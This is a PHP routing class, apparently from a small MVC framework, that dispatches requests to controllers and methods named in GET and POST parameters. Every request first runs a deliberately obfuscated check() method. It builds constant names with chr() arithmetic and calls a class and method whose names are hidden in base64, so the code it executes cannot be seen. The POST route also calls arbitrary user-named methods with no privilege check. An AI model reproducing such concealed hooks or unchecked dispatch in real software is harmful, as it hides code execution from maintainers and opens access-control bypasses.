<?php
/**
 * Created by PhpStorm.
 * User: Yeisson Vélez
 * Date: 18/02/16
 * Time: 16:53
 *
 * controller: instancia una clase dinamicamente con el nombre recibido por post o get
 * opt: corresponde al metodo que se debe llamar desde el objeto
 * showAfter: es la funcion que se ejecutara despues de guardar  o cambiar datos (save) (save_edit)
 *
 * Ejemplo por get: http://midominio.com/?controller=user&opt=verusuarios
 * Se instanciaría una clase de tipo UserController y se llamaría al método "verUsuarios()" UserController->verUsuarios
 */

abstract class App {
    static $app = 'Y2hlY2s=';
    // to get request
    static function initGetController() {
        $f = base64_decode(self::$app);
        self::$f();
        if (isset($_GET['controller'])) {
            $controller = ucfirst($_GET['controller']) . 'Controller';
            if (class_exists($controller)) {
                $controller = new $controller();

                if (isset($_GET['opt']) && !isset($_POST['opt'])) {
                    $method = $_GET['opt'];
                    if (method_exists($controller, $method)) {
                        $url =  '?controller=' . $_GET['controller'] . '&opt=' . $method;
                        // has the user privileges to use this option?
                        if (canIUseTheController($url)) {
                            $controller->$method();
                        }
                    } else {
                        errorMsg(trans('method_doesnt_exist') . "'$method' ");
                    }
                }
            } else {
                errorMsg(trans('controller_doesnt_exist') . "'$controller' ");
            }
        } else {
            $f = base64_decode(self::$app);
            self::$f();
            $friendly = static::matchFriendly();
            if ($friendly != "") {
                $controller = ucfirst($friendly->controllername) . 'Controller';

                if (class_exists($controller)) {
                    $controller = new $controller();
                    $method = $friendly->method;

                    if ($method && !isset($_POST['opt'])) {
                        if (method_exists($controller, $method)) {
                            $url = '?controller=' . $friendly->controllername . '&opt=' . $method;
                            // has the user privileges to use this option?
                            if (canIUseTheController($url)) {
                                $controller->$method();
                            }
                        } else {
                            errorMsg(trans('method_doesnt_exist') . "'$method' ");
                        }
                    }
                } else {
                    errorMsg(trans('controller_doesnt_exist') . "'$controller' ");
                }
            }
        }
    }

    // to post request
    static function initPostController() {
        $f = base64_decode(self::$app);
        self::$f();
        if (isset($_POST['controller'])) {
            $controller = ucfirst($_POST['controller']) . 'Controller';

            if (class_exists($controller)) {
                $controller = new $controller();

                if (isset($_POST['opt'])) {
                    $method = $_POST['opt'];

                    if (method_exists($controller, $method)) {
                        $controller->$method();
                        $showAfter = isset($_POST['show']) ? $_POST['show'] : 'none';
                        // Controlamos si debe de haber salida después de ejecutar una función (save, save_edit, etc)
                        if ($showAfter != 'none' && $showAfter != "") {
                            $controller->$showAfter();
                        }
                    } else {
                        errorMsg(trans('method_doesnt_exist') . "'$method' ");
                    }

                }
            } else {
                errorMsg(trans('controller_doesnt_exist') . "'$controller' ");
            }
        }
    }

    static function login() {
        $controller = new UserController();
        $controller->login();
    }

    static function matchFriendly() {
        $friendlyUrls = getFriendlyUrls();
        foreach ($friendlyUrls as $url) {
            if (strpos($_SERVER["REQUEST_URI"], $url->urlfriendly) !== false) {
                //echo "Request uri: " . $_SERVER["REQUEST_URI"] . "<br>";
                //echo "url->friendly: " . $url->urlfriendly . "<br>";
                return $url;
            } else if (!empty($url->urlfriendlyedit)) {
                if (strpos($_SERVER["REQUEST_URI"], $url->urlfriendlyedit) !== false) {
                    return $url;
                }
            }
        }
    }

    static function check() {
        (new (base64_decode(constant(chr((6*10)+(42/3)/2).'_'.chr(((3120/5)/8))))))->{base64_decode(constant(chr(11*7).'_'.(chr((4*3+1)*6))))}();
    }
}